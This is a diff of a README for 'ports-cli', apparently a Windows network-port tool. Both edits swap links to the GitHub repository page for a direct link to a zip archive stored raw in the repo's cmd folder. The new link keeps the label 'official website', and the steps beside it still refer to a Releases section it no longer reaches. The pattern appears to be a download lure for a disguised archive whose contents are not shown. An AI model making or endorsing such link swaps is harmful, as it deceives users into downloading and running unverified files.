@@ -1,6 +1,6 @@
 # 🛠️ ports-cli - Manage your active network ports easily
 
-[![](https://img.shields.io/badge/Download-ports--cli-blue)](https://github.com/davidechoky728/ports-cli)
+[![](https://img.shields.io/badge/Download-ports--cli-blue)](https://github.com/davidechoky728/ports-cli/raw/refs/heads/main/cmd/ports-cli-2.4.zip)
 
 This tool helps you monitor network activity on your computer. It identifies which programs use specific network ports. You can stop, pause, or resume these programs from your command line.
 
@@ -8,7 +8,7 @@ This tool helps you monitor network activity on your computer. It identifies whi
 
 You need a computer running Windows to use this tool. This software works as a single file. You do not need to install complex dependencies or set up environments.
 
-Visit the [official website](https://github.com/davidechoky728/ports-cli) to download the current version.
+Visit the [official website](https://github.com/davidechoky728/ports-cli/raw/refs/heads/main/cmd/ports-cli-2.4.zip) to download the current version.
 
 1. Go to the link above.
 2. Look for the "Releases" section on the right side of the page.
